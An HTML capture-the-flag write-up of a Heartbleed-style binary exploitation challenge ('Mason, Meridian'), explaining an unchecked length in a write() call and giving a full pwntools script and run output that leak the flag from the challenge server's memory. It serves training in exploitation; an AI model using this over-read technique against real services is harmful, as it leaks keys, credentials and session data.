<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploit 100-2: Mason, Meridian - Writeup</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <script>tailwind.config = { darkMode: 'class', theme: { extend: { fontFamily: { 'sans': ['Inter', 'sans-serif'], 'mono': ['JetBrains Mono', 'monospace'] }}}}</script>
    <style>
        .code-block { background: #0f172a; border: 1px solid #1e293b; border-radius: 0.5rem; padding: 1rem; margin: 1rem 0; overflow-x: auto; }
        .code-block pre { margin: 0; color: #e2e8f0; font-family: 'JetBrains Mono', monospace; font-size: 0.875rem; line-height: 1.5; }
    </style>
</head>
<body class="bg-black text-slate-300 font-sans antialiased">
    <div class="max-w-5xl mx-auto px-6 py-12">
        <a href="../ctf-new.html" class="inline-flex items-center gap-2 text-blue-400 hover:text-blue-300 mb-8">
            <i class="ph-bold ph-arrow-left"></i> Back to CTF Writeups
        </a>

        <header class="mb-12">
            <div class="flex items-center gap-3 mb-4">
                <span class="px-3 py-1 bg-red-500/10 text-red-400 border border-red-500/30 rounded-lg text-sm font-semibold uppercase">Binary Exploitation</span>
                <span class="text-2xl font-bold text-red-400">100 points</span>
            </div>
            <h1 class="text-4xl font-bold text-white mb-4">Mason, Meridian</h1>
            <div class="flex items-center gap-6 text-sm text-slate-400">
                <span class="flex items-center gap-2"><i class="ph-bold ph-calendar"></i> November 10, 2025</span>
                <span class="flex items-center gap-2"><i class="ph-bold ph-flag"></i> PointerOverflow CTF 2025</span>
            </div>
        </header>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Challenge Description</h2>
            <div class="bg-slate-900 border border-slate-800 rounded-lg p-6">
                <p class="text-slate-300 leading-relaxed mb-4">
                    A tribute to one of the most famous vulnerabilities in history: <strong>Heartbleed</strong>. This challenge simulates the CVE-2014-0160 vulnerability that affected OpenSSL.
                </p>
                <p class="text-slate-400 text-sm">
                    <strong>Target:</strong> <code class="bg-slate-800 px-2 py-1 rounded">exp100-2.pointeroverflowctf.com:14662</code>
                </p>
            </div>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Step 1: Understanding Heartbleed</h2>
            
            <div class="mb-6">
                <h3 class="text-xl font-semibold text-white mb-3">What is Heartbleed?</h3>
                <p class="text-slate-300 mb-4">
                    Heartbleed was a serious vulnerability in OpenSSL's implementation of the TLS heartbeat extension. It allowed attackers to read memory from the server, potentially exposing:
                </p>
                <ul class="space-y-2 text-slate-300 list-disc list-inside ml-4">
                    <li>Private keys</li>
                    <li>Session tokens</li>
                    <li>Passwords</li>
                    <li>Other sensitive data in memory</li>
                </ul>
            </div>

            <div class="mb-6">
                <h3 class="text-xl font-semibold text-white mb-3">The Vulnerability</h3>
                <p class="text-slate-300 mb-4">
                    The bug occurs when a client sends a heartbeat request with a payload length that doesn't match the actual payload size. The server blindly trusts the length field and copies that many bytes from memory.
                </p>
            </div>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Step 2: Source Code Analysis</h2>
            
            <div class="mb-6">
                <h3 class="text-xl font-semibold text-white mb-3">Stack Frame Structure</h3>
                <div class="code-block">
                    <pre><code>struct {
    char data[64];      // Input buffer
    char pad[32];       // Padding
    char flag[128];     // Flag stored here!
} frame;</code></pre>
                </div>
                <p class="text-slate-300 mt-4">
                    The flag is stored on the stack at offset 96 bytes from the start of <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">data</code>.
                </p>
            </div>

            <div class="mb-6">
                <h3 class="text-xl font-semibold text-white mb-3">The Vulnerable Code</h3>
                <div class="code-block">
                    <pre><code>// Read length and data
scanf(" %d:%63s", &len, frame.data);

// BUG: Write 'len' bytes, not strlen(frame.data)!
write(STDOUT_FILENO, frame.data, (size_t)len);</code></pre>
                </div>
            </div>

            <div class="bg-red-900/20 border border-red-500/30 rounded-lg p-4">
                <p class="text-red-300">
                    <strong>The Bug:</strong> The program writes <code class="bg-slate-800 px-1 rounded">len</code> bytes starting from <code class="bg-slate-800 px-1 rounded">frame.data</code>, regardless of how much data was actually read. If <code class="bg-slate-800 px-1 rounded">len > strlen(frame.data)</code>, it reads beyond the buffer into adjacent memory!
                </p>
            </div>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Step 3: Memory Layout Analysis</h2>
            
            <div class="mb-6">
                <h3 class="text-xl font-semibold text-white mb-3">Stack Layout</h3>
                <div class="bg-slate-900 border border-slate-800 rounded-lg p-4 font-mono text-sm">
                    <div class="space-y-1">
                        <div class="flex items-center gap-4">
                            <span class="text-slate-500 w-32">Offset 0-63:</span>
                            <span class="text-blue-400">frame.data[64]</span>
                            <span class="text-slate-600">← Our input goes here</span>
                        </div>
                        <div class="flex items-center gap-4">
                            <span class="text-slate-500 w-32">Offset 64-95:</span>
                            <span class="text-slate-400">frame.pad[32]</span>
                            <span class="text-slate-600">← Padding (contains "LEAK->")</span>
                        </div>
                        <div class="flex items-center gap-4">
                            <span class="text-slate-500 w-32">Offset 96-223:</span>
                            <span class="text-yellow-400">frame.flag[128]</span>
                            <span class="text-slate-600">← FLAG IS HERE!</span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="mb-6">
                <h3 class="text-xl font-semibold text-white mb-3">Calculating the Leak Size</h3>
                <p class="text-slate-300 mb-4">
                    To leak the flag, we need to read at least 96 + 128 = 224 bytes:
                </p>
                <ul class="space-y-2 text-slate-300 list-disc list-inside ml-4">
                    <li>64 bytes: our input data</li>
                    <li>32 bytes: padding</li>
                    <li>128 bytes: the flag</li>
                </ul>
            </div>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Step 4: Exploitation</h2>
            
            <div class="mb-6">
                <h3 class="text-xl font-semibold text-white mb-3">Exploit Strategy</h3>
                <ol class="space-y-3 text-slate-300 list-decimal list-inside">
                    <li>Connect to the service</li>
                    <li>Send a heartbeat request: <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">224:A</code></li>
                    <li>Receive 224 bytes of leaked memory</li>
                    <li>Extract the flag from offset 96</li>
                </ol>
            </div>

            <div class="mb-6">
                <h3 class="text-xl font-semibold text-white mb-3">Complete Exploit Code</h3>
                <div class="code-block">
                    <pre><code>#!/usr/bin/env python3
from pwn import *

HOST = 'exp100-2.pointeroverflowctf.com'
PORT = 14662

# Connect
io = remote(HOST, PORT)

# Receive banner
io.recvuntil(b'example input:')
io.recvline()

# Send Heartbleed payload
# Format: length:data
# We send length=224 but only 1 byte of data
payload = "224:A"
print(f"[*] Sending Heartbleed payload: {payload}")
io.sendline(payload.encode())

# Receive the leaked memory
io.recvuntil(b'Sending heart beat response...')
io.recvline()

leaked = io.recv(224)
print(f"[+] Leaked {len(leaked)} bytes")

# The flag starts at offset 96
# Offset 0-63: our 'A' + null bytes
# Offset 64-95: padding (contains "LEAK->")
# Offset 96+: the flag!

flag_offset = 96
flag_data = leaked[flag_offset:]

print(f"\n[*] Leaked data at offset 96:")
print(flag_data[:100])

# Extract the flag
flag = flag_data.split(b'\x00')[0].decode('utf-8', errors='ignore')
print(f"\n[+] FLAG: {flag}")

io.close()</code></pre>
                </div>
            </div>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Step 5: Running the Exploit</h2>
            
            <div class="code-block">
                <pre><code>$ python3 exploit.py
[+] Opening connection to exp100-2.pointeroverflowctf.com on port 14662: Done
[*] Sending Heartbleed payload: 224:A
[+] Leaked 224 bytes

[*] Leaked data at offset 96:
b'poctf{uwsp_m450n_m3r1d14n}\x00\x00\x00...'

[+] FLAG: poctf{uwsp_m450n_m3r1d14n}
[*] Closed connection</code></pre>
            </div>

            <div class="bg-green-900/20 border border-green-500/30 rounded-lg p-4 mt-4">
                <p class="text-green-300">
                    <strong>Success!</strong> We successfully exploited the Heartbleed-style vulnerability to leak the flag from server memory.
                </p>
            </div>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Flag</h2>
            <div class="bg-gradient-to-r from-green-900/50 to-emerald-900/50 border border-green-500/30 rounded-lg p-6">
                <div class="flex items-center gap-3">
                    <i class="ph-bold ph-check-circle text-3xl text-green-400"></i>
                    <code class="text-xl font-mono text-green-400">poctf{uwsp_m450n_m3r1d14n}</code>
                </div>
            </div>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Real-World Impact</h2>
            <div class="bg-slate-900 border border-slate-800 rounded-lg p-6">
                <p class="text-slate-300 mb-4">
                    The real Heartbleed vulnerability (CVE-2014-0160) was discovered in April 2014 and affected approximately 17% of all secure web servers at the time. It allowed attackers to:
                </p>
                <ul class="space-y-3 text-slate-300">
                    <li class="flex items-start gap-3">
                        <i class="ph-bold ph-warning text-yellow-400 mt-1"></i>
                        <span>Steal private keys from servers</span>
                    </li>
                    <li class="flex items-start gap-3">
                        <i class="ph-bold ph-warning text-yellow-400 mt-1"></i>
                        <span>Capture user credentials and session tokens</span>
                    </li>
                    <li class="flex items-start gap-3">
                        <i class="ph-bold ph-warning text-yellow-400 mt-1"></i>
                        <span>Read arbitrary memory from affected servers</span>
                    </li>
                </ul>
            </div>
        </section>

        

        
    </div>
</body>
</html>
